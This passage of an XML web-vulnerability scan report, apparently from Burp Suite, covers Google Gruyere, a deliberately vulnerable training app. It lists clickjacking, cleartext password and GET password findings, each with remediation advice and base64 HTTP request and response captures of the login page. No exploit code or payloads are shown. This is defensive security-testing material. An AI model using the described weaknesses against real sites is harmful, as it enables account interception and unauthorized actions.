QgYSwgI21lbnUtbGVmdCBhOmhvdmVyLCAjbWVudS1sZWZ0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCiNtZW51LXJpZ2h0IHsKICBmbG9hdDogcmlnaHQ7Cn0KCiNtZW51LXJpZ2h0IGEsICNtZW51LXJpZ2h0IGE6aG92ZXIsICNtZW51LXJpZ2h0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCi5tZXNzYWdlIHsKICB3aWR0aDogNTAlOwogIGNvbG9yOiAjZmYwMDAwOwogIGJhY2tncm91bmQ6ICNmZmRkZGQ7CiAgYm9yZGVyOiAycHggc29saWQgI2ZmMDAwMDsKICBib3JkZXItcmFkaXVzOiAxZW07CiAgLW1vei1ib3JkZXItcmFkaXVzOiAxZW07CiAgcGFkZGluZzogMTBweDsKICBmb250LXdlaWdodDogYm9sZDsKICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgbWFyZ2luOiBhdXRvOwogIG1hcmdpbi10b3A6IDIwcHg7CiAgbWFyZ2luLWJvdHRvbTogMjBweDsKfQoKaW5wdXQsIHRleHRhcmVhIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjZmZmZmZmOwp9CgoucmVmcmVzaCB7CiAgZmxvYXQ6IGNlbnRlcjsKICB3aWR0aDogOTAlOwogIHRleHQtYWxpZ246IHJpZ2h0OwogIG1hcmdpbjogYXV0bzsKICBwYWRkaW5nLXRvcDogMDsKICBwYWRkaW5nLWJvdHRvbTogMnB0OwogIG1hcmdpbi10b3A6IDA7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKLmgyLXdpdGgtcmVmcmVzaCB7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKPC9zdHlsZT4KCjwvaGVhZD4KCjxib2R5PgoKPGRpdiBjbGFzcz0nbWVudSc+CiAgPHNwYW4gaWQ9J21lbnUtbGVmdCc+CiAgICA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2Lyc+SG9tZTwvYT4KICAgICAgCiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9zbmlwcGV0cy5ndGwnPk15Jm5ic3A7U25pcHBldHM8L2E+CiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9uZXdzbmlwcGV0Lmd0bCc+TmV3Jm5ic3A7U25pcHBldDwvYT4KICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L3VwbG9hZC5ndGwnPlVwbG9hZDwvYT4KICAgICAgCiAgPC9zcGFuPgogIDxzcGFuIGlkPSdtZW51LXJpZ2h0Jz4KICAgICAgCiAgICAgIDxzcGFuIGNsYXNzPSdtZW51LXVzZXInPgogICAgICAgIDU1NS01NTUtMDE5OUBleGFtcGxlLmNvbSAmbHQ7NTU1LTU1NS0wMTk5QGV4YW1wbGUuY29tJmd0OwogICAgICA8L3NwYW4+CiAgICAgIAogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvZWRpdHByb2ZpbGUuZ3RsJz5Qcm9maWxlPC9hPgogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbG9nb3V0Jz5TaWduIG91dDwvYT4KICAgICAgCiAgICAgIAogIDwvc3Bhbj4KPC9kaXY+Cgo8ZGl2Pgo8aDI+R3J1eWVyZTogTG9naW48L2gyPgo8L2Rpdj4KCgoKPGRpdiBjbGFzcz0nY29udGVudCc+Cjxmb3JtIG1ldGhvZD0nZ2V0JyBhY3Rpb249Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbG9naW4nPgo8dGFibGU+PHRyPjx0ZD4KICAgIFVzZXIgbmFtZToKICA8L3RkPjx0ZD4KICAgIDxpbnB1dCB0eXBlPSd0ZXh0JyBuYW1lPSd1aWQnPgo8L3RkPjwvdHI+PHRyPjx0ZD4KICAgIFBhc3N3b3JkOgogIDwvdGQ+PHRkPgogICAgPGlucHV0IHR5cGU9J3Bhc3N3b3JkJyBuYW1lPSdwdyc+CjwvdGQ+PC90cj48dHI+PHRkPjwvdGQ+PHRkIGFsaWduPSdyaWdodCc+CiAgICA8aW5wdXQgdHlwZT0nc3VibWl0JyB2YWx1ZT0nTG9naW4nPgo8L3RkPjwvdHI+PC90YWJsZT4KPC9mb3JtPgo8L2Rpdj4KPC9ib2R5PgoKPC9odG1sPgo=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>4415487186593792</serialNumber>
    <type>5245344</type>
    <name><![CDATA[Frameable response (potential Clickjacking)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/421683968655469260586300829583795792326/login]]></path>
    <location><![CDATA[/421683968655469260586300829583795792326/login]]></location>
    <severity>Information</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>If a page fails to set an appropriate X-Frame-Options or Content-Security-Policy HTTP header, it might be possible for a page controlled by an attacker to load it within an iframe. This may enable a clickjacking attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery, and may result in unauthorized actions.</p>
<p>Note that some applications attempt to prevent these attacks from within the HTML page itself, using "framebusting" code. However, this type of defense is normally ineffective and can usually be circumvented by a skilled attacker.</p>
<p>You should determine whether any functions accessible within frameable pages can be used by application users to perform any sensitive actions within the application. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>To effectively prevent framing attacks, the application should return a response header with the name <b>X-Frame-Options</b> and the value <b>DENY</b> to prevent framing altogether, or the value <b>SAMEORIGIN</b> to allow framing only by pages on the same origin as the response itself. Note that the SAMEORIGIN header can be partially bypassed if the application itself can be made to frame untrusted websites.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options">X-Frame-Options</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/693.html">CWE-693: Protection Mechanism Failure</a></li>
</ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbG9naW4gSFRUUC8xLjENCkhvc3Q6IGdvb2dsZS1ncnV5ZXJlLmFwcHNwb3QuY29tDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkFjY2VwdDogKi8qDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTVNJRSA5LjA7IFdpbmRvd3MgTlQgNi4xOyBXaW42NDsgeDY0OyBUcmlkZW50LzUuMCkNCkNvbm5lY3Rpb246IGNsb3NlDQpSZWZlcmVyOiBodHRwOi8vZ29vZ2xlLWdydXllcmUuYXBwc3BvdC5jb20vNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2Lw0KQ29va2llOiBHUlVZRVJFX0lEPTQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNg0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KQ29udGVudC10eXBlOiB0ZXh0L2h0bWwNClByYWdtYTogbm8tY2FjaGUNClgtWFNTLVByb3RlY3Rpb246IDANClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogYzQ5MjUzYmU0YjJkNTc5OGM4NzhhZGY4ZTUwOWQwNjINClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTozOTo1OCBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMjk5MA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KPCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiI+CjwhLS0gQ29weXJpZ2h0IDIwMTcgR29vZ2xlIEluYy4gLS0+CjxodG1sPgo8aGVhZD4KPHRpdGxlPkdydXllcmU6IExvZ2luPC90aXRsZT4KPHN0eWxlPgovKiBDb3B5cmlnaHQgMjAxNyBHb29nbGUgSW5jLiAqLwoKYm9keSwgaHRtbCwgdGQsIHNwYW4sIGRpdiwgaW5wdXQsIHRleHRhcmVhIHsKICBmb250LWZhbWlseTogc2Fucy1zZXJpZjsKICBmb250LXNpemU6IDE0cHQ7Cn0KCmJvZHkgewogIGJhY2tncm91bmQ6IHVybCgnY2hlZXNlLnBuZycpIHRvcCBjZW50ZXIgcmVwZWF0OwogIHRleHQtYWxpZ246IGNlbnRlcjsKICBvcGFjaXR5OiAwLjgwOwp9CgpoMiB7CiAgdGV4dC1hbGlnbjogY2VudGVyOwogIGZvbnQtc2l6ZTogMzBwdDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKdGQgewogIHZlcnRpY2FsLWFsaWduOiB0b3A7CiAgcGFkZGluZzogNXB4Owp9CgphLCBhOmhvdmVyIHsKICB0ZXh0LWRlY29yYXRpb246IHVuZGVybGluZTsKICBjb2xvcjogIzAwMDBiYjsKfQoKYTp2aXNpdGVkIHsKICBjb2xvcjogI2JiMDAwMDsKfQoKYS5idXR0b246dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwYmI7Cn0KCi5jb250ZW50IHsKICB0ZXh0LWFsaWduOiBsZWZ0OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICB3aWR0aDogOTAlOwogIGJhY2tncm91bmQ6ICNmZmZmY2M7CiAgcGFkZGluZzogMjBweDsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudSB7CiAgdGV4dC1hbGlnbjogbGVmdDsKICBwYWRkaW5nOiAxMHB4IDIwcHggMzVweCAyMHB4OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICBtYXJnaW4tdG9wOiAyMHB4OwogIHdpZHRoOiA5MCU7CiAgYmFja2dyb3VuZDogI2ZmZmZjYzsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudS11c2VyIHsKICBjb2xvcjogIzAwMDAwMDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKI21lbnUtbGVmdCB7CiAgZmxvYXQ6IGxlZnQ7Cn0KCiNtZW51LWxlZnQgYSwgI21lbnUtbGVmdCBhOmhvdmVyLCAjbWVudS1sZWZ0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCiNtZW51LXJpZ2h0IHsKICBmbG9hdDogcmlnaHQ7Cn0KCiNtZW51LXJpZ2h0IGEsICNtZW51LXJpZ2h0IGE6aG92ZXIsICNtZW51LXJpZ2h0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCi5tZXNzYWdlIHsKICB3aWR0aDogNTAlOwogIGNvbG9yOiAjZmYwMDAwOwogIGJhY2tncm91bmQ6ICNmZmRkZGQ7CiAgYm9yZGVyOiAycHggc29saWQgI2ZmMDAwMDsKICBib3JkZXItcmFkaXVzOiAxZW07CiAgLW1vei1ib3JkZXItcmFkaXVzOiAxZW07CiAgcGFkZGluZzogMTBweDsKICBmb250LXdlaWdodDogYm9sZDsKICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgbWFyZ2luOiBhdXRvOwogIG1hcmdpbi10b3A6IDIwcHg7CiAgbWFyZ2luLWJvdHRvbTogMjBweDsKfQoKaW5wdXQsIHRleHRhcmVhIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjZmZmZmZmOwp9CgoucmVmcmVzaCB7CiAgZmxvYXQ6IGNlbnRlcjsKICB3aWR0aDogOTAlOwogIHRleHQtYWxpZ246IHJpZ2h0OwogIG1hcmdpbjogYXV0bzsKICBwYWRkaW5nLXRvcDogMDsKICBwYWRkaW5nLWJvdHRvbTogMnB0OwogIG1hcmdpbi10b3A6IDA7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKLmgyLXdpdGgtcmVmcmVzaCB7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKPC9zdHlsZT4KCjwvaGVhZD4KCjxib2R5PgoKPGRpdiBjbGFzcz0nbWVudSc+CiAgPHNwYW4gaWQ9J21lbnUtbGVmdCc+CiAgICA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2Lyc+SG9tZTwvYT4KICAgICAgCiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9zbmlwcGV0cy5ndGwnPk15Jm5ic3A7U25pcHBldHM8L2E+CiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9uZXdzbmlwcGV0Lmd0bCc+TmV3Jm5ic3A7U25pcHBldDwvYT4KICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L3VwbG9hZC5ndGwnPlVwbG9hZDwvYT4KICAgICAgCiAgPC9zcGFuPgogIDxzcGFuIGlkPSdtZW51LXJpZ2h0Jz4KICAgICAgCiAgICAgIDxzcGFuIGNsYXNzPSdtZW51LXVzZXInPgogICAgICAgIDU1NS01NTUtMDE5OUBleGFtcGxlLmNvbSAmbHQ7NTU1LTU1NS0wMTk5QGV4YW1wbGUuY29tJmd0OwogICAgICA8L3NwYW4+CiAgICAgIAogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvZWRpdHByb2ZpbGUuZ3RsJz5Qcm9maWxlPC9hPgogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbG9nb3V0Jz5TaWduIG91dDwvYT4KICAgICAgCiAgICAgIAogIDwvc3Bhbj4KPC9kaXY+Cgo8ZGl2Pgo8aDI+R3J1eWVyZTogTG9naW48L2gyPgo8L2Rpdj4KCgoKPGRpdiBjbGFzcz0nY29udGVudCc+Cjxmb3JtIG1ldGhvZD0nZ2V0JyBhY3Rpb249Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbG9naW4nPgo8dGFibGU+PHRyPjx0ZD4KICAgIFVzZXIgbmFtZToKICA8L3RkPjx0ZD4KICAgIDxpbnB1dCB0eXBlPSd0ZXh0JyBuYW1lPSd1aWQnPgo8L3RkPjwvdHI+PHRyPjx0ZD4KICAgIFBhc3N3b3JkOgogIDwvdGQ+PHRkPgogICAgPGlucHV0IHR5cGU9J3Bhc3N3b3JkJyBuYW1lPSdwdyc+CjwvdGQ+PC90cj48dHI+PHRkPjwvdGQ+PHRkIGFsaWduPSdyaWdodCc+CiAgICA8aW5wdXQgdHlwZT0nc3VibWl0JyB2YWx1ZT0nTG9naW4nPgo8L3RkPjwvdHI+PC90YWJsZT4KPC9mb3JtPgo8L2Rpdj4KPC9ib2R5PgoKPC9odG1sPgo=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>4969769325010516992</serialNumber>
    <type>3145984</type>
    <name><![CDATA[Cleartext submission of password]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/421683968655469260586300829583795792326/login]]></path>
    <location><![CDATA[/421683968655469260586300829583795792326/login]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Some applications transmit passwords over unencrypted connections, making them vulnerable to interception. To exploit this vulnerability, an attacker must be suitably positioned to eavesdrop on the victim's network traffic. This scenario typically occurs when a client communicates with the server over an insecure connection such as public Wi-Fi, or a corporate or home network that is shared with a compromised computer. Common defenses such as switched networks are not sufficient to prevent this. An attacker situated in the user's ISP or the application's hosting infrastructure could also perform this attack. Note that an advanced adversary could potentially target any connection made over the Internet's core infrastructure.</p>
<p>Vulnerabilities that result in the disclosure of users' passwords can result in compromises that are extremely difficult to investigate due to obscured audit trails. Even if the application itself only handles non-sensitive information, exposing passwords puts users who have re-used their password elsewhere at risk.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>Applications should use transport-level encryption (SSL or TLS) to protect all sensitive communications passing between the client and the server. Communications that should be protected include the login mechanism and related functionality, and any functions where sensitive data can be accessed or privileged actions can be performed. These areas should employ their own session handling mechanism, and the session tokens used should never be transmitted over unencrypted communications. If HTTP cookies are used for transmitting session tokens, then the secure flag should be set to prevent transmission over clear-text HTTP.</p>]]></remediationBackground>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/319.html">CWE-319: Cleartext Transmission of Sensitive Information</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The page contains a form with the following action URL, which is submitted over clear-text HTTP:<ul><li>http://google-gruyere.appspot.com/421683968655469260586300829583795792326/login</li></ul>The form contains the following password field:<ul><li>pw</li></ul>]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbG9naW4gSFRUUC8xLjENCkhvc3Q6IGdvb2dsZS1ncnV5ZXJlLmFwcHNwb3QuY29tDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkFjY2VwdDogKi8qDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTVNJRSA5LjA7IFdpbmRvd3MgTlQgNi4xOyBXaW42NDsgeDY0OyBUcmlkZW50LzUuMCkNCkNvbm5lY3Rpb246IGNsb3NlDQpSZWZlcmVyOiBodHRwOi8vZ29vZ2xlLWdydXllcmUuYXBwc3BvdC5jb20vNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2Lw0KQ29va2llOiBHUlVZRVJFX0lEPTQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNg0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KQ29udGVudC10eXBlOiB0ZXh0L2h0bWwNClByYWdtYTogbm8tY2FjaGUNClgtWFNTLVByb3RlY3Rpb246IDANClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogYzQ5MjUzYmU0YjJkNTc5OGM4NzhhZGY4ZTUwOWQwNjINClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTozOTo1OCBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMjk5MA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KPCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiI+CjwhLS0gQ29weXJpZ2h0IDIwMTcgR29vZ2xlIEluYy4gLS0+CjxodG1sPgo8aGVhZD4KPHRpdGxlPkdydXllcmU6IExvZ2luPC90aXRsZT4KPHN0eWxlPgovKiBDb3B5cmlnaHQgMjAxNyBHb29nbGUgSW5jLiAqLwoKYm9keSwgaHRtbCwgdGQsIHNwYW4sIGRpdiwgaW5wdXQsIHRleHRhcmVhIHsKICBmb250LWZhbWlseTogc2Fucy1zZXJpZjsKICBmb250LXNpemU6IDE0cHQ7Cn0KCmJvZHkgewogIGJhY2tncm91bmQ6IHVybCgnY2hlZXNlLnBuZycpIHRvcCBjZW50ZXIgcmVwZWF0OwogIHRleHQtYWxpZ246IGNlbnRlcjsKICBvcGFjaXR5OiAwLjgwOwp9CgpoMiB7CiAgdGV4dC1hbGlnbjogY2VudGVyOwogIGZvbnQtc2l6ZTogMzBwdDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKdGQgewogIHZlcnRpY2FsLWFsaWduOiB0b3A7CiAgcGFkZGluZzogNXB4Owp9CgphLCBhOmhvdmVyIHsKICB0ZXh0LWRlY29yYXRpb246IHVuZGVybGluZTsKICBjb2xvcjogIzAwMDBiYjsKfQoKYTp2aXNpdGVkIHsKICBjb2xvcjogI2JiMDAwMDsKfQoKYS5idXR0b246dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwYmI7Cn0KCi5jb250ZW50IHsKICB0ZXh0LWFsaWduOiBsZWZ0OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICB3aWR0aDogOTAlOwogIGJhY2tncm91bmQ6ICNmZmZmY2M7CiAgcGFkZGluZzogMjBweDsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudSB7CiAgdGV4dC1hbGlnbjogbGVmdDsKICBwYWRkaW5nOiAxMHB4IDIwcHggMzVweCAyMHB4OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICBtYXJnaW4tdG9wOiAyMHB4OwogIHdpZHRoOiA5MCU7CiAgYmFja2dyb3VuZDogI2ZmZmZjYzsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudS11c2VyIHsKICBjb2xvcjogIzAwMDAwMDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKI21lbnUtbGVmdCB7CiAgZmxvYXQ6IGxlZnQ7Cn0KCiNtZW51LWxlZnQgYSwgI21lbnUtbGVmdCBhOmhvdmVyLCAjbWVudS1sZWZ0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCiNtZW51LXJpZ2h0IHsKICBmbG9hdDogcmlnaHQ7Cn0KCiNtZW51LXJpZ2h0IGEsICNtZW51LXJpZ2h0IGE6aG92ZXIsICNtZW51LXJpZ2h0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCi5tZXNzYWdlIHsKICB3aWR0aDogNTAlOwogIGNvbG9yOiAjZmYwMDAwOwogIGJhY2tncm91bmQ6ICNmZmRkZGQ7CiAgYm9yZGVyOiAycHggc29saWQgI2ZmMDAwMDsKICBib3JkZXItcmFkaXVzOiAxZW07CiAgLW1vei1ib3JkZXItcmFkaXVzOiAxZW07CiAgcGFkZGluZzogMTBweDsKICBmb250LXdlaWdodDogYm9sZDsKICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgbWFyZ2luOiBhdXRvOwogIG1hcmdpbi10b3A6IDIwcHg7CiAgbWFyZ2luLWJvdHRvbTogMjBweDsKfQoKaW5wdXQsIHRleHRhcmVhIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjZmZmZmZmOwp9CgoucmVmcmVzaCB7CiAgZmxvYXQ6IGNlbnRlcjsKICB3aWR0aDogOTAlOwogIHRleHQtYWxpZ246IHJpZ2h0OwogIG1hcmdpbjogYXV0bzsKICBwYWRkaW5nLXRvcDogMDsKICBwYWRkaW5nLWJvdHRvbTogMnB0OwogIG1hcmdpbi10b3A6IDA7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKLmgyLXdpdGgtcmVmcmVzaCB7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKPC9zdHlsZT4KCjwvaGVhZD4KCjxib2R5PgoKPGRpdiBjbGFzcz0nbWVudSc+CiAgPHNwYW4gaWQ9J21lbnUtbGVmdCc+CiAgICA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2Lyc+SG9tZTwvYT4KICAgICAgCiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9zbmlwcGV0cy5ndGwnPk15Jm5ic3A7U25pcHBldHM8L2E+CiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9uZXdzbmlwcGV0Lmd0bCc+TmV3Jm5ic3A7U25pcHBldDwvYT4KICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L3VwbG9hZC5ndGwnPlVwbG9hZDwvYT4KICAgICAgCiAgPC9zcGFuPgogIDxzcGFuIGlkPSdtZW51LXJpZ2h0Jz4KICAgICAgCiAgICAgIDxzcGFuIGNsYXNzPSdtZW51LXVzZXInPgogICAgICAgIDU1NS01NTUtMDE5OUBleGFtcGxlLmNvbSAmbHQ7NTU1LTU1NS0wMTk5QGV4YW1wbGUuY29tJmd0OwogICAgICA8L3NwYW4+CiAgICAgIAogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvZWRpdHByb2ZpbGUuZ3RsJz5Qcm9maWxlPC9hPgogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbG9nb3V0Jz5TaWduIG91dDwvYT4KICAgICAgCiAgICAgIAogIDwvc3Bhbj4KPC9kaXY+Cgo8ZGl2Pgo8aDI+R3J1eWVyZTogTG9naW48L2gyPgo8L2Rpdj4KCgoKPGRpdiBjbGFzcz0nY29udGVudCc+Cjxmb3JtIG1ldGhvZD0nZ2V0JyBhY3Rpb249Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbG9naW4nPgo8dGFibGU+PHRyPjx0ZD4KICAgIFVzZXIgbmFtZToKICA8L3RkPjx0ZD4KICAgIDxpbnB1dCB0eXBlPSd0ZXh0JyBuYW1lPSd1aWQnPgo8L3RkPjwvdHI+PHRyPjx0ZD4KICAgIFBhc3N3b3JkOgogIDwvdGQ+PHRkPgogICAgPGlucHV0IHR5cGU9J3Bhc3N3b3JkJyBuYW1lPSdwdyc+CjwvdGQ+PC90cj48dHI+PHRkPjwvdGQ+PHRkIGFsaWduPSdyaWdodCc+CiAgICA8aW5wdXQgdHlwZT0nc3VibWl0JyB2YWx1ZT0nTG9naW4nPgo8L3RkPjwvdHI+PC90YWJsZT4KPC9mb3JtPgo8L2Rpdj4KPC9ib2R5PgoKPC9odG1sPgo=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>8063742329327709184</serialNumber>
    <type>4195072</type>
    <name><![CDATA[Password submitted using GET method]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/421683968655469260586300829583795792326/login]]></path>
    <location><![CDATA[/421683968655469260586300829583795792326/login]]></location>
    <severity>Low</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Some applications use the GET method to submit passwords, which are transmitted within the query string of the requested URL. Sensitive information within URLs may be logged in various locations, including the user's browser, the web server, and any forward or reverse proxy servers between the two endpoints. URLs may also be displayed on-screen, bookmarked or emailed around by users. They may be disclosed to third parties via the Referer header when any off-site links are followed. Placing passwords into the URL increases the risk that they will be captured by an attacker.</p>
<p>Vulnerabilities that result in the disclosure of users' passwords can result in compromises that are extremely difficult to investigate due to obscured audit trails. Even if the application itself only handles non-sensitive information, exposing passwords puts users who have re-used their password elsewhere at risk.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>All forms submitting passwords should use the POST method. To achieve this, applications should specify the method attribute of the FORM tag as <b>method="POST"</b>. It may also be necessary to modify the corresponding server-side form handler to ensure that submitted passwords are properly retrieved from the message body, rather than the URL.
</p>]]></remediationBackground>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/598.html">CWE-598: Information Exposure Through Query Strings in GET Request</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The page contains a form with the following action URL, which is submitted using the GET method:<ul><li>http://google-gruyere.appspot.com/421683968655469260586300829583795792326/login</li></ul>The form contains the following password field:<ul><li>pw</li></ul>]]></issueDetail>
    <issueDetailItems>
      <issueDetailItem><![CDATA[pw]]></issueDetailItem>
    </issueDetailItems>
    <requestresponse>
